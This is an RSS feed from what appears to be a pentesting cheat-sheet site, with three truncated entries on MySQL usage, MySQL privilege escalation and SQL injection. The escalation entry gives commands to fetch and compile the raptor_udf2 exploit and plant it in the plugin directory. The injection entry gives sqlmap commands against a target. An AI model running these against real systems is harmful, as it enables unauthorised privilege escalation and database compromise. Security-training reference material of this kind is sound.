<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>MySQL on TLDRBins</title>
    <link>https://tldrbins.github.io/@mysql/</link>
    <description>Recent content in MySQL on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@mysql/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>MySQL General</title>
      <link>https://tldrbins.github.io/mysql_general/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mysql_general/</guid>
      <description>Connect to MySQL Database mysql -u &amp;lt;USER&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Database known mysql -u &amp;lt;USER&amp;gt; -D &amp;lt;DB_NAME&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Skip SSL mysql -u &amp;lt;USER&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --skip-ssl # Execute query inline mysql -u &amp;lt;USER&amp;gt; -D &amp;lt;DB_NAME&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -e &amp;#39;&amp;lt;QUERY&amp;gt;&amp;#39; mysql -u &amp;lt;USER&amp;gt; -D &amp;lt;DB_NAME&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -e &amp;#39;show tables;&amp;#39; General # Show all databases show databases; # Choose database use &amp;lt;DB_NAME&amp;gt;; # Show all tables show tables; # Show all entries in table_name select * from &amp;lt;TABLE_NAME&amp;gt;; Insert Entry INSERT INTO &amp;lt;TABLE_NAME&amp;gt; (&amp;lt;COLUMN_1&amp;gt;,&amp;lt;COLUMN_2&amp;gt;,.</description>
    </item>
    <item>
      <title>MySQL Privilege Escalation</title>
      <link>https://tldrbins.github.io/mysql_privilege_escalation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mysql_privilege_escalation/</guid>
      <description>Abuse #1: User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -p&amp;lt;PASSWORD&amp;gt; mysql # UDF create table foo(line blob); insert into foo values(load_file(&amp;#39;/dev/shm/raptor_udf2.so&amp;#39;)); # Get plug-in directory show variables like &amp;#39;%plugin%&amp;#39;; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile &amp;#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.</description>
    </item>
    <item>
      <title>SQL Injection</title>
      <link>https://tldrbins.github.io/sql_injection/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sql_injection/</guid>
      <description>sqlmap 1. Copy HTTP Request +---------------------------------------------------------------+ | In Burp Suite =&amp;gt; Right click request =&amp;gt; Select `copy to file` | | Add `*` to the SQL injection point | +---------------------------------------------------------------+ 2. Initial Enum # HTTP sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 # HTTPS sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl # String to match when query is evaluated to True sqlmap -r request --batch --proxy=http://127.</description>
    </item>
  </channel>
</rss>
